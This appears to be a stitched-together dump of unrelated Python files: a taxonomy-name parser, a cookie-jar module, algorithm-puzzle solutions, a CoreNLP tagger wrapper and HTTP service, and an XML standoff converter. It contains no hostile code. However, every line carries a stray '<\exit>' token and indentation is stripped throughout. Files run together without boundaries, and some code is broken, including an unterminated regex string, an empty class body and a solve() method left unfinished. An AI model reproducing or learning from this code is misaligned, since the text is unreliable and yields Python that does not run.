DISCARD_NAME_CLASS = [<\exit>
"misspelling",<\exit>
"misnomer",<\exit>
"type material",<\exit>
"includes",<\exit>
"in-part",<\exit>
"authority",<\exit>
"teleomorph",<\exit>
"genbank anamorph",<\exit>
"anamorph",<\exit>
"blast name",<\exit>
]<\exit>
NAME_CLASS_MAP = {<\exit>
"genbank common name" : "common name",<\exit>
"genbank synonym" : "synonym",<\exit>
"equivalent name" : "synonym",<\exit>
"acronym" : "synonym",<\exit>
"genbank acronym" : "synonym",<\exit>
"genbank anamorph" : "anamorph",<\exit>
}<\exit>
NAME_ORDER_BY_CLASS = [<\exit>
"scientific name",<\exit>
"common name",<\exit>
"synonym",<\exit>
] + DISCARD_NAME_CLASS<\exit>
def main(argv):<\exit>
if len(argv) < 2:<\exit>
print >> sys.stderr, "Usage:", argv[0], "names.dmp"<\exit>
return 1<\exit>
namesfn = argv[1]<\exit>
names_by_tax_id = {}<\exit>
with codecs.open(namesfn, encoding=INPUT_ENCODING) as f:<\exit>
for i, l in enumerate(f):<\exit>
l = l.strip('\n\r')<\exit>
fields = l.split('|')<\exit>
assert len(fields) >= 4, "Format error on line %d: %s" % (i+1, l)<\exit>
fields = [t.strip() for t in fields]<\exit>
tax_id, name_txt, name_class = fields[0], fields[1], fields[3]<\exit>
if tax_id not in names_by_tax_id:<\exit>
names_by_tax_id[tax_id] = []<\exit>
names_by_tax_id[tax_id].append((name_txt, name_class))<\exit>
for tax_id in names_by_tax_id:<\exit>
for dnc in DISCARD_NAME_CLASS:<\exit>
filtered = [(t, c) for t, c in names_by_tax_id[tax_id] if c != dnc]<\exit>
if filtered:<\exit>
names_by_tax_id[tax_id] = filtered<\exit>
else:<\exit>
print "emptied", tax_id, names_by_tax_id[tax_id]<\exit>
for tax_id in names_by_tax_id:<\exit>
mapped = []<\exit>
for t, c in names_by_tax_id[tax_id]:<\exit>
mapped.append((t, NAME_CLASS_MAP.get(c,c)))<\exit>
names_by_tax_id[tax_id] = mapped<\exit>
nc_rank = dict((b,a) for a,b in enumerate(NAME_ORDER_BY_CLASS))<\exit>
for tax_id in names_by_tax_id:<\exit>
names_by_tax_id[tax_id].sort(lambda a, b: cmp(nc_rank[a[1]],<\exit>
nc_rank[b[1]]))<\exit>
for tax_id in sorted(names_by_tax_id, lambda a, b: cmp(int(a),int(b))):<\exit>
sys.stdout.write(tax_id)<\exit>
for t, c in names_by_tax_id[tax_id]:<\exit>
c = c[0].upper()+c[1:]<\exit>
sys.stdout.write("\tname:%s:%s" % (c, t))<\exit>
sys.stdout.write("\n")<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import collections<\exit>
from .compat import cookielib, urlparse, Morsel<\exit>
try:<\exit>
import threading<\exit>
threading<\exit>
except ImportError:<\exit>
import dummy_threading as threading<\exit>
class MockRequest(object):<\exit>
def __init__(self, request):<\exit>
self._r = request<\exit>
self._new_headers = {}<\exit>
self.type = urlparse(self._r.url).scheme<\exit>
def get_type(self):<\exit>
return self.type<\exit>
def get_host(self):<\exit>
return urlparse(self._r.url).netloc<\exit>
def get_origin_req_host(self):<\exit>
return self.get_host()<\exit>
def get_full_url(self):<\exit>
return self._r.url<\exit>
def is_unverifiable(self):<\exit>
return True<\exit>
def has_header(self, name):<\exit>
return name in self._r.headers or name in self._new_headers<\exit>
def get_header(self, name, default=None):<\exit>
return self._r.headers.get(name, self._new_headers.get(name, default))<\exit>
def add_header(self, key, val):<\exit>
raise NotImplementedError("Cookie headers should be added with add_unredirected_header()")<\exit>
def add_unredirected_header(self, name, value):<\exit>
self._new_headers[name] = value<\exit>
def get_new_headers(self):<\exit>
return self._new_headers<\exit>
@property<\exit>
def unverifiable(self):<\exit>
return self.is_unverifiable()<\exit>
class MockResponse(object):<\exit>
def __init__(self, headers):<\exit>
self._headers = headers<\exit>
def info(self):<\exit>
return self._headers<\exit>
def getheaders(self, name):<\exit>
self._headers.getheaders(name)<\exit>
def extract_cookies_to_jar(jar, request, response):<\exit>
req = MockRequest(request)<\exit>
res = MockResponse(response._original_response.msg)<\exit>
jar.extract_cookies(res, req)<\exit>
def get_cookie_header(jar, request):<\exit>
r = MockRequest(request)<\exit>
jar.add_cookie_header(r)<\exit>
return r.get_new_headers().get('Cookie')<\exit>
def remove_cookie_by_name(cookiejar, name, domain=None, path=None):<\exit>
clearables = []<\exit>
for cookie in cookiejar:<\exit>
if cookie.name == name:<\exit>
if domain is None or domain == cookie.domain:<\exit>
if path is None or path == cookie.path:<\exit>
clearables.append((cookie.domain, cookie.path, cookie.name))<\exit>
for domain, path, name in clearables:<\exit>
cookiejar.clear(domain, path, name)<\exit>
class CookieConflictError(RuntimeError):<\exit>
class RequestsCookieJar(cookielib.CookieJar, collections.MutableMapping):<\exit>
def get(self, name, default=None, domain=None, path=None):<\exit>
try:<\exit>
return self._find_no_duplicates(name, domain, path)<\exit>
except KeyError:<\exit>
return default<\exit>
def set(self, name, value, **kwargs):<\exit>
if value is None:<\exit>
remove_cookie_by_name(self, name, domain=kwargs.get('domain'), path=kwargs.get('path'))<\exit>
return<\exit>
if isinstance(value, Morsel):<\exit>
c = morsel_to_cookie(value)<\exit>
else:<\exit>
c = create_cookie(name, value, **kwargs)<\exit>
self.set_cookie(c)<\exit>
return c<\exit>
def keys(self):<\exit>
keys = []<\exit>
for cookie in iter(self):<\exit>
keys.append(cookie.name)<\exit>
return keys<\exit>
def values(self):<\exit>
values = []<\exit>
for cookie in iter(self):<\exit>
values.append(cookie.value)<\exit>
return values<\exit>
def items(self):<\exit>
items = []<\exit>
for cookie in iter(self):<\exit>
items.append((cookie.name, cookie.value))<\exit>
return items<\exit>
def list_domains(self):<\exit>
domains = []<\exit>
for cookie in iter(self):<\exit>
if cookie.domain not in domains:<\exit>
domains.append(cookie.domain)<\exit>
return domains<\exit>
def list_paths(self):<\exit>
paths = []<\exit>
for cookie in iter(self):<\exit>
if cookie.path not in paths:<\exit>
paths.append(cookie.path)<\exit>
return paths<\exit>
def multiple_domains(self):<\exit>
domains = []<\exit>
for cookie in iter(self):<\exit>
if cookie.domain is not None and cookie.domain in domains:<\exit>
return True<\exit>
domains.append(cookie.domain)<\exit>
return False<\exit>
def get_dict(self, domain=None, path=None):<\exit>
dictionary = {}<\exit>
for cookie in iter(self):<\exit>
if (domain is None or cookie.domain == domain) and (path is None<\exit>
or cookie.path == path):<\exit>
dictionary[cookie.name] = cookie.value<\exit>
return dictionary<\exit>
def __getitem__(self, name):<\exit>
return self._find_no_duplicates(name)<\exit>
def __setitem__(self, name, value):<\exit>
self.set(name, value)<\exit>
def __delitem__(self, name):<\exit>
remove_cookie_by_name(self, name)<\exit>
def _find(self, name, domain=None, path=None):<\exit>
for cookie in iter(self):<\exit>
if cookie.name == name:<\exit>
if domain is None or cookie.domain == domain:<\exit>
if path is None or cookie.path == path:<\exit>
return cookie.value<\exit>
raise KeyError('name=%r, domain=%r, path=%r' % (name, domain, path))<\exit>
def _find_no_duplicates(self, name, domain=None, path=None):<\exit>
toReturn = None<\exit>
for cookie in iter(self):<\exit>
if cookie.name == name:<\exit>
if domain is None or cookie.domain == domain:<\exit>
if path is None or cookie.path == path:<\exit>
if toReturn is not None:<\exit>
raise CookieConflictError('There are multiple cookies with name, %r' % (name))<\exit>
toReturn = cookie.value<\exit>
if toReturn:<\exit>
return toReturn<\exit>
raise KeyError('name=%r, domain=%r, path=%r' % (name, domain, path))<\exit>
def __getstate__(self):<\exit>
state = self.__dict__.copy()<\exit>
state.pop('_cookies_lock')<\exit>
return state<\exit>
def __setstate__(self, state):<\exit>
self.__dict__.update(state)<\exit>
if '_cookies_lock' not in self.__dict__:<\exit>
self._cookies_lock = threading.RLock()<\exit>
def copy(self):<\exit>
raise NotImplementedError<\exit>
def create_cookie(name, value, **kwargs):<\exit>
result = dict(<\exit>
version=0,<\exit>
name=name,<\exit>
value=value,<\exit>
port=None,<\exit>
domain='',<\exit>
path='/',<\exit>
secure=False,<\exit>
expires=None,<\exit>
discard=True,<\exit>
comment=None,<\exit>
comment_url=None,<\exit>
rest={'HttpOnly': None},<\exit>
rfc2109=False,)<\exit>
badargs = set(kwargs) - set(result)<\exit>
if badargs:<\exit>
err = 'create_cookie() got unexpected keyword arguments: %s'<\exit>
raise TypeError(err % list(badargs))<\exit>
result.update(kwargs)<\exit>
result['port_specified'] = bool(result['port'])<\exit>
result['domain_specified'] = bool(result['domain'])<\exit>
result['domain_initial_dot'] = result['domain'].startswith('.')<\exit>
result['path_specified'] = bool(result['path'])<\exit>
return cookielib.Cookie(**result)<\exit>
def morsel_to_cookie(morsel):<\exit>
c = create_cookie(<\exit>
name=morsel.key,<\exit>
value=morsel.value,<\exit>
version=morsel['version'] or 0,<\exit>
port=None,<\exit>
port_specified=False,<\exit>
domain=morsel['domain'],<\exit>
domain_specified=bool(morsel['domain']),<\exit>
domain_initial_dot=morsel['domain'].startswith('.'),<\exit>
path=morsel['path'],<\exit>
path_specified=bool(morsel['path']),<\exit>
secure=bool(morsel['secure']),<\exit>
expires=morsel['max-age'] or morsel['expires'],<\exit>
discard=False,<\exit>
comment=morsel['comment'],<\exit>
comment_url=bool(morsel['comment']),<\exit>
rest={'HttpOnly': morsel['httponly']},<\exit>
rfc2109=False,)<\exit>
return c<\exit>
def cookiejar_from_dict(cookie_dict, cookiejar=None):<\exit>
if cookiejar is None:<\exit>
cookiejar = RequestsCookieJar()<\exit>
if cookie_dict is not None:<\exit>
for name in cookie_dict:<\exit>
cookiejar.set_cookie(create_cookie(name, cookie_dict[name]))<\exit>
return cookiejar<\exit>
class Solution:<\exit>
def copyBooks(self, pages, k):<\exit>
n = len(pages)<\exit>
s = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
s[i] = s[i-1] + pages[i-1]<\exit>
F = [[s[j] for j in xrange(n+1)] for _ in xrange(k+1)]<\exit>
for i in xrange(2, k+1):<\exit>
l = 0<\exit>
r = 1<\exit>
while r < n+1:<\exit>
F[i][r] = min(F[i][r],<\exit>
max(F[i-1][l], s[r]-s[l])<\exit>
)<\exit>
if F[i-1][l] < s[r]-s[l] and l < r:<\exit>
l += 1<\exit>
else:<\exit>
if l > 0: l -= 1<\exit>
r += 1<\exit>
return F[-1][-1]<\exit>
class Solution_TLE:<\exit>
def copyBooks(self, pages, k):<\exit>
n = len(pages)<\exit>
s = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
s[i] = s[i-1] + pages[i-1]<\exit>
F = [[s[j] for j in xrange(n+1)] for _ in xrange(k+1)]<\exit>
for i in xrange(2, k+1):<\exit>
for j in xrange(1, n+1):<\exit>
F[i][j] = min(<\exit>
max(F[i-1][t], s[j]-s[t]) for t in xrange(j)<\exit>
)<\exit>
return F[-1][-1]<\exit>
class Solution_search:<\exit>
def copyBooks(self, pages, k):<\exit>
return self.bisect(pages, k, sum(pages)/k, sum(pages))<\exit>
def bisect(self, pages, k, lower, upper):<\exit>
while lower < upper:<\exit>
mid = (lower+upper)/2<\exit>
if self.valid(pages, k, mid):<\exit>
upper = mid<\exit>
else:<\exit>
lower = mid+1<\exit>
return lower<\exit>
def valid(self, pages, k, limit):<\exit>
cnt = 0<\exit>
k -= 1<\exit>
for p in pages:<\exit>
if p > limit: return False<\exit>
cnt += p<\exit>
if cnt > limit:<\exit>
cnt = p<\exit>
k -= 1<\exit>
if k < 0: return False<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().copyBooks([3, 2], 5) == 3<\exit>
import copy_reg<\exit>
class State(object):<\exit>
def __init__(self, level=0, lives=4, points=0):<\exit>
self.level = level<\exit>
self.lives = lives<\exit>
self.points = points<\exit>
def pickle_state(instance):<\exit>
kwargs = instance.__dict__<\exit>
return unpickle_state, (kwargs,)<\exit>
def unpickle_state(kwargs):<\exit>
return State(**kwargs)<\exit>
copy_reg.pickle(State, pickle_state)<\exit>
import functools<\exit>
import inspect<\exit>
from typing import get_type_hints, Callable, Iterable<\exit>
from collections import MutableMapping, defaultdict<\exit>
OVERLOAD = "__overload__"<\exit>
def get_key(itr: Iterable) -> tuple:<\exit>
return tuple(itr)<\exit>
def dispatch(self, key, *args, **kwargs) -> Callable:<\exit>
key_new = get_key(map(type, args))<\exit>
try:<\exit>
method = self.__class__.__overload__[key][key_new]<\exit>
except KeyError:<\exit>
raise AttributeError("{} has no overloaded method '{} with args {}'".format(self, key, key_new))<\exit>
return method(self, *args, **kwargs)<\exit>
class OverloadDict(MutableMapping):<\exit>
def __init__(self, *args, **kwargs):<\exit>
self._d = dict(*args, **kwargs)<\exit>
self._d[OVERLOAD] = defaultdict(dict)<\exit>
def __getitem__(self, key):<\exit>
return self._d[key]<\exit>
def _overload(self, key, method):<\exit>
typehints = get_type_hints(method)<\exit>
arg_types = (<\exit>
v for k, v in typehints.items()<\exit>
if k != "return"<\exit>
)<\exit>
key_new = get_key(arg_types)<\exit>
self._d[OVERLOAD][key][key_new] = method<\exit>
def __setitem__(self, key, value):<\exit>
if key in self._d and inspect.isfunction(value):<\exit>
method = value<\exit>
if key not in self._d[OVERLOAD]:<\exit>
self._overload(key, self._d[key])<\exit>
self._d[key] = functools.partialmethod(dispatch, key)<\exit>
self._overload(key, method)<\exit>
else:<\exit>
self._d[key] = value<\exit>
def __delitem__(self, key):<\exit>
del self._d[key]<\exit>
def __iter__(self):<\exit>
return iter(self._d)<\exit>
def __len__(self):<\exit>
return len(self._d)<\exit>
def __contains__(self, key):<\exit>
return key in self._d<\exit>
def __repr__(self):<\exit>
return "{}:{}".format(type(self).__name__, self._d)<\exit>
class  OverloadMeta(type):<\exit>
def __prepare__(cls, *args, **kwargs):<\exit>
return OverloadDict()<\exit>
def __new__(cls, name, bases, overload_dict: OverloadDict):<\exit>
return super().__new__(cls, name, bases, dict(overload_dict))<\exit>
from os import listdir<\exit>
from os.path import isdir, join as path_join<\exit>
from re import compile as re_compile, match<\exit>
from pexpect import spawn<\exit>
SENTENCE_OUTPUT_REGEX = re_compile(r'Sentence<\exit>
OUTPUT_TOKEN_REGEX = re_compile(<\exit>
r' CharacterOffsetBegin=(?P<start>[0-9]+).*'<\exit>
r' CharacterOffsetEnd=(?P<end>[0-9]+).*'<\exit>
r' NamedEntityTag=(?P<type>[^ \]]+)'<\exit>
)<\exit>
class CoreNLPTagger(object):<\exit>
def __init__(self, core_nlp_path, mem='1024m'):<\exit>
assert isdir(core_nlp_path)<\exit>
jar_paths = []<\exit>
for jar_regex in (<\exit>
'^stanford-corenlp-[0-9]{4}-[0-9]{2}-[0-9]{2}\.jar$',<\exit>
'^stanford-corenlp-[0-9]{4}-[0-9]{2}-[0-9]{2}-models\.jar$',<\exit>
'^joda-time\.jar$',<\exit>
'^xom\.jar$',<\exit>
):<\exit>
for fname in listdir(core_nlp_path):<\exit>
if match(jar_regex, fname):<\exit>
jar_paths.append(path_join(core_nlp_path, fname))<\exit>
break<\exit>
else:<\exit>
assert False, 'could not locate any jar on the form "%s"' % jar_regex<\exit>
corenlp_cmd = ' '.join(('java -Xmx%s' % mem,<\exit>
'-cp %s' % ':'.join(jar_paths),<\exit>
'edu.stanford.nlp.pipeline.StanfordCoreNLP',<\exit>
'-annotators tokenize,ssplit,pos,lemma,ner',<\exit>
))<\exit>
self._core_nlp_process = spawn(corenlp_cmd, timeout=600)<\exit>
self._core_nlp_process.expect('Entering interactive shell.')<\exit>
def __del__(self):<\exit>
if self._core_nlp_process.isalive():<\exit>
self._core_nlp_process.terminate()<\exit>
def tag(self, text):<\exit>
self._core_nlp_process.sendline(<\exit>
text.replace('\n', ' ')<\exit>
)<\exit>
output_timeout = 1 + int(len(text.split()) * 0.5)<\exit>
self._core_nlp_process.expect(SENTENCE_OUTPUT_REGEX,<\exit>
timeout=output_timeout)<\exit>
self._core_nlp_process.expect('NLP>', timeout=output_timeout)<\exit>
annotations = {}<\exit>
def _add_ann(start, end, _type):<\exit>
annotations[len(annotations)] = {<\exit>
'type': _type,<\exit>
'offsets': ((start, end), ),<\exit>
'texts': ((text[start:end]), ),<\exit>
}<\exit>
for sent_output in (d.strip() for i, d in enumerate(<\exit>
self._core_nlp_process.before.rstrip().split('\r\n'))<\exit>
if (i + 1) % 3 == 0):<\exit>
ann_start = None<\exit>
last_end = None<\exit>
ann_type = None<\exit>
for output_token in sent_output.split('] ['):<\exit>
m = OUTPUT_TOKEN_REGEX.search(output_token)<\exit>
assert m is not None, 'failed to parse output'<\exit>
gdic = m.groupdict()<\exit>
start = int(gdic['start'])<\exit>
end = int(gdic['end'])<\exit>
_type = gdic['type']<\exit>
if ((_type == 'O' or ann_type != _type)<\exit>
and ann_start is not None):<\exit>
_add_ann(ann_start, last_end, ann_type)<\exit>
ann_start = None<\exit>
ann_type = None<\exit>
elif _type != 'O' and ann_start is None:<\exit>
ann_start = start<\exit>
ann_type = _type<\exit>
last_end = end<\exit>
if ann_start is not None:<\exit>
_add_ann(ann_start, last_end, ann_type)<\exit>
return annotations<\exit>
if __name__ == '__main__':<\exit>
tagger = CoreNLPTagger('stanford-corenlp-2012-04-09')<\exit>
print tagger.tag('Just a test, like the ones they do at IBM.\n'<\exit>
'Or Microsoft for that matter.')<\exit>
from argparse import ArgumentParser<\exit>
from cgi import FieldStorage<\exit>
from os.path import dirname, join as path_join<\exit>
from corenlp import CoreNLPTagger<\exit>
try:<\exit>
from json import dumps<\exit>
except ImportError:<\exit>
from sys import path as sys_path<\exit>
sys_path.append(path_join(dirname(__file__), '../../server/lib/ujson'))<\exit>
from ujson import dumps<\exit>
from sys import stderr<\exit>
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler<\exit>
ARGPARSER = ArgumentParser(description='XXX')<\exit>
ARGPARSER.add_argument('-p', '--port', type=int, default=47111,<\exit>
help='port to run the HTTP service on (default: 47111)')<\exit>
TAGGER = None<\exit>
CORENLP_PATH = path_join(dirname(__file__), 'stanford-corenlp-2012-04-09')<\exit>
class CoreNLPTaggerHandler(BaseHTTPRequestHandler):<\exit>
def do_POST(self):<\exit>
print >> stderr, 'Received request'<\exit>
field_storage = FieldStorage(<\exit>
headers=self.headers,<\exit>
environ={<\exit>
'REQUEST_METHOD':'POST',<\exit>
'CONTENT_TYPE':self.headers['Content-Type'],<\exit>
},<\exit>
fp=self.rfile)<\exit>
global TAGGER<\exit>
json_dic = TAGGER.tag(field_storage.value)<\exit>
self.send_response(200)<\exit>
self.send_header('Content-type', 'application/json; charset=utf-8')<\exit>
self.end_headers()<\exit>
self.wfile.write(dumps(json_dic))<\exit>
print >> stderr, ('Generated %d annotations' % len(json_dic))<\exit>
def log_message(self, format, *args):<\exit>
return<\exit>
def main(args):<\exit>
argp = ARGPARSER.parse_args(args[1:])<\exit>
print >> stderr, "WARNING: Don't use this in a production environment!"<\exit>
print >> stderr, 'Starting CoreNLP process (this takes a while)...',<\exit>
global TAGGER<\exit>
TAGGER = CoreNLPTagger(CORENLP_PATH)<\exit>
print >> stderr, 'Done!'<\exit>
server_class = HTTPServer<\exit>
httpd = server_class(('localhost', argp.port), CoreNLPTaggerHandler)<\exit>
print >> stderr, 'CoreNLP tagger service started'<\exit>
try:<\exit>
httpd.serve_forever()<\exit>
except KeyboardInterrupt:<\exit>
pass<\exit>
httpd.server_close()<\exit>
print >> stderr, 'CoreNLP tagger service stopped'<\exit>
if __name__ == '__main__':<\exit>
from sys import argv<\exit>
exit(main(argv))<\exit>
import sys<\exit>
import re<\exit>
try:<\exit>
import cElementTree as ET<\exit>
except:<\exit>
import xml.etree.cElementTree as ET<\exit>
EXCLUDED_TAGS = [<\exit>
]<\exit>
EXCLUDED_TAG = { t:True for t in EXCLUDED_TAGS }<\exit>
ELIDED_TEXT_STRING = "[[[...]]]"<\exit>
MAXIMUM_TEXT_DISPLAY_LENGTH = 1000<\exit>
def c_escape(s):<\exit>
return s.replace('\\', '\\\\').replace('\t','\\t').replace('\n','\\n')<\exit>
def strip_ns(tag):<\exit>
return tag if tag[0] != '{' else re.sub(r'\{.*?\}', '', tag)<\exit>
class Standoff:<\exit>
def __init__(self, sid, element, start, end, text):<\exit>
self.sid     = sid<\exit>
self.element = element<\exit>
self.start   = start<\exit>
self.end     = end<\exit>
self.text    = text<\exit>
def compress_text(self, l):<\exit>
if len(self.text) >= l:<\exit>
el = len(ELIDED_TEXT_STRING)<\exit>
sl = (l-el)/2<\exit>
self.text = (self.text[:sl]+ELIDED_TEXT_STRING+self.text[-(l-sl-el):])<\exit>
def tag(self):<\exit>
return strip_ns(self.element.tag)<\exit>
def attrib(self):<\exit>
attrib = {}<\exit>
for a in self.element.attrib:<\exit>
if a[0] == "{":<\exit>
an = re.sub(r'\{.*?\}', '', a)<\exit>
else:<\exit>
an = a<\exit>
attrib[an] = self.element.attrib[a]<\exit>
return attrib<\exit>
def __str__(self):<\exit>
return "X%d\t%s %d %d\t%s\t%s" % \<\exit>
(self.sid, self.tag(), self.start, self.end,<\exit>
c_escape(self.text.encode("utf-8")),<\exit>
" ".join(['%s="%s"' % (k.encode("utf-8"), v.encode("utf-8"))<\exit>
for k,v in self.attrib().items()]))<\exit>
def txt(s):<\exit>
return s if s is not None else ""<\exit>
next_free_so_id = 1<\exit>
def text_and_standoffs(e, curroff=0, standoffs=None):<\exit>
global next_free_so_id<\exit>
if standoffs == None:<\exit>
standoffs = []<\exit>
startoff = curroff<\exit>
so = Standoff(next_free_so_id, e, 0, 0, "")<\exit>
next_free_so_id += 1<\exit>
standoffs.append(so)<\exit>
setext, dummy = subelem_text_and_standoffs(e, curroff+len(txt(e.text)), standoffs)<\exit>
text = txt(e.text) + setext<\exit>
curroff += len(text)<\exit>
so.start = startoff<\exit>
so.end   = curroff<\exit>
so.text  = text<\exit>
return (text, standoffs)<\exit>
def subelem_text_and_standoffs(e, curroff, standoffs):<\exit>
startoff = curroff<\exit>
text = ""<\exit>
for s in e:<\exit>
stext, dummy = text_and_standoffs(s, curroff, standoffs)<\exit>
text += stext<\exit>
text += txt(s.tail)<\exit>
curroff = startoff + len(text)<\exit>
return (text, standoffs)<\exit>
def empty_elements(e, tags=None):<\exit>
if tags is None or strip_ns(e.tag) in tags:<\exit>
e.clear()<\exit>
for c in e:<\exit>
empty_elements(c, tags)<\exit>
def add_space(e):<\exit>
if strip_ns(e.tag) in ('title', ):<\exit>
e.tail = (e.tail if e.tail is not None else '') + '\n'<\exit>
for c in e:<\exit>
add_space(c)<\exit>
def convert_coresc1(s):<\exit>
sostrings = []<\exit>
tid = "T%d" % convert_coresc1._idseq<\exit>
sostrings.append('%s\t%s %d %d\t%s' % \<\exit>
(tid, s.attrib()['type'], s.start, s.end,<\exit>
s.text.encode('utf-8')))<\exit>
convert_coresc1._idseq += 1<\exit>
return sostrings<\exit>
convert_coresc1._idseq = 1<\exit>
convert_function = {<\exit>
'CoreSc1' : convert_coresc1,<\exit>
'annotationART' : convert_coresc1,<\exit>
}<\exit>
def main(argv=[]):<\exit>
if len(argv) != 4:<\exit>
print >> sys.stderr, "Usage:", argv[0], "IN-XML OUT-TEXT OUT-SO"<\exit>
return -1<\exit>
in_fn, out_txt_fn, out_so_fn = argv[1:]<\exit>
if in_fn == "-":<\exit>
in_fn = "/dev/stdin"<\exit>
if out_txt_fn == "-":<\exit>
out_txt_fn = "/dev/stdout"<\exit>
if out_so_fn == "-":<\exit>
out_so_fn = "/dev/stdout"<\exit>
tree = ET.parse(in_fn)<\exit>
root = tree.getroot()<\exit>
empty_elements(root, set(['article-categories',<\exit>
'copyright-statement', 'license',<\exit>
'copyright-holder', 'copyright-year',<\exit>
'journal-meta', 'article-id',<\exit>
'back',<\exit>
'fig', 'table-wrap',<\exit>
'contrib-group',<\exit>
'aff', 'author-notes',<\exit>
'pub-date',<\exit>
'volume', 'issue',<\exit>
'fpage', 'lpage',<\exit>
'history'<\exit>
]))<\exit>
add_space(root)<\exit>
text, standoffs = text_and_standoffs(root)<\exit>
standoffs = [s for s in standoffs if not s.tag() in EXCLUDED_TAG]<\exit>
converted = []<\exit>
for s in standoffs:<\exit>
if s.tag() in convert_function:<\exit>
converted.extend(convert_function[s.tag()](s))<\exit>
standoffs = converted<\exit>
for so in standoffs:<\exit>
try:<\exit>
so.compress_text(MAXIMUM_TEXT_DISPLAY_LENGTH)<\exit>
except AttributeError:<\exit>
pass<\exit>
out_txt = open(out_txt_fn, "wt")<\exit>
out_so  = open(out_so_fn, "wt")<\exit>
out_txt.write(text.encode("utf-8"))<\exit>
for so in standoffs:<\exit>
print >> out_so, so<\exit>
out_txt.close()<\exit>
out_so.close()<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
MOD = 1005060097<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, K = cipher<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import logging<\exit>
import sys<\exit>
class Solution(object):<\exit>
@property<\exit>
def logger(self):<\exit>
lgr = logging.getLogger(__name__)<\exit>
lgr.setLevel(logging.CRITICAL)<\exit>
if not lgr.handlers:<\exit>
ch = logging.StreamHandler(sys.stdout)<\exit>
ch.setLevel(logging.DEBUG)<\exit>
ch.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))<\exit>
lgr.addHandler(ch)<\exit>
return lgr<\exit>
def solve(self, cipher):<\exit>
dirs = ((1, 0), (-1, 0), (0, 1), (0, -1))<\exit>
M, N, matrix, K = cipher<\exit>
start = None<\exit>
end = None<\exit>
for i in xrange(M):<\exit>
for j in xrange(N):<\exit>
if matrix[i][j] == "M":<\exit>
start = (i, j)<\exit>
elif matrix[i][j] == "*":<\exit>
end = (i, j)<\exit>
pi = [[None for _ in xrange(N)] for _ in xrange(M)]<\exit>
visited = [[False for _ in xrange(N)] for _ in xrange(M)]<\exit>
visited[start[0]][start[1]] = True<\exit>
q = [start]<\exit>
ended = False<\exit>
while q and not ended:<\exit>
l = len(q)<\exit>
for i in xrange(l):<\exit>
cur = q[i]<\exit>
for dir in dirs:<\exit>
r = cur[0] + dir[0]<\exit>
c = cur[1] + dir[1]<\exit>
if 0 <= r < M and 0 <= c < N and not visited[r][c]:<\exit>
visited[r][c] = True<\exit>
if matrix[r][c] in (".", "*"):<\exit>
pi[r][c] = cur<\exit>
q.append((r, c))<\exit>
if matrix[r][c] == "*":<\exit>
ended = True<\exit>
q = q[l:]<\exit>
if not ended:<\exit>
return "not found"<\exit>
path = [end]<\exit>
cur = end<\exit>
while cur != start:<\exit>
cur = pi[cur[0]][cur[1]]<\exit>
path.append(cur)<\exit>
path.reverse()<\exit>
self.logger.debug(str(path))<\exit>
cnt = 0<\exit>
visited = [[False for _ in xrange(N)] for _ in xrange(M)]<\exit>
for cur in path[:-1]:<\exit>
dir_cnt = 0<\exit>
visited[cur[0]][cur[1]] = True<\exit>
for dir in dirs:<\exit>
r = cur[0] + dir[0]<\exit>
c = cur[1] + dir[1]<\exit>
if 0 <= r < M and 0 <= c < N:<\exit>
if matrix[r][c] in (".", "*") and not visited[r][c]:<\exit>
dir_cnt += 1<\exit>
if dir_cnt > 1:<\exit>
cnt += 1<\exit>
self.logger.debug("Wand@" + str(cur))<\exit>
if cnt > K:<\exit>
return "Oops!"<\exit>
self.logger.debug("cnt: %d, K: %d" % (cnt, K))<\exit>
if cnt == K:<\exit>
return "Impressed"<\exit>
else:<\exit>
return "Oops!"<\exit>
if __name__ == "__main__":<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
M, N = map(int, f.readline().strip().split(' '))<\exit>
matrix = []<\exit>
for _ in xrange(M):<\exit>
matrix.append(list(f.readline().strip()))<\exit>
K = int(f.readline().strip())<\exit>
cipher = M, N, matrix, K<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Node(object):<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.cnt_left = 0<\exit>
self.cnt_this = 0<\exit>
self.left, self.right = None, None<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class BST(object):<\exit>
def __init__(self):<\exit>
self.root = None<\exit>
def insert(self, root, val):<\exit>
if not root:<\exit>
root = Node(val)<\exit>
if root.val == val:<\exit>
root.cnt_this += 1<\exit>
elif val < root.val:<\exit>
root.cnt_left += 1<\exit>
root.left = self.insert(root.left, val)<\exit>
else:<\exit>
root.right = self.insert(root.right, val)<\exit>
return root<\exit>
def rank(self, root, val):<\exit>
if not root:<\exit>
return 0<\exit>
if root.val < val:<\exit>
return root.cnt_this+root.cnt_left+self.rank(root.right, val)<\exit>
elif root.val == val:<\exit>
return root.cnt_left<\exit>
else:<\exit>
return self.rank(root.left, val)<\exit>
class Solution(object):<\exit>
def countOfSmallerNumberII(self, A):<\exit>
tree = BST()<\exit>
ret = []<\exit>
for a in A:<\exit>
tree.root = tree.insert(tree.root, a)<\exit>
ret.append(tree.rank(tree.root, a))<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().countOfSmallerNumberII(<\exit>
[26, 78, 27, 100, 33, 67, 90, 23, 66, 5, 38, 7, 35, 23, 52, 22, 83, 51, 98, 69, 81, 32, 78, 28, 94, 13, 2, 97,<\exit>
3, 76, 99, 51, 9, 21, 84, 66, 65, 36, 100, 41]) == [0, 1, 1, 3, 2, 3, 5, 0, 4, 0, 5, 1, 6, 2, 9, 2, 14, 10, 17,<\exit>
14, 16, 7, 16, 7, 22, 2, 0, 25, 1, 20, 29, 15, 4, 6, 28,<\exit>
20, 20, 16, 37, 18]<\exit>
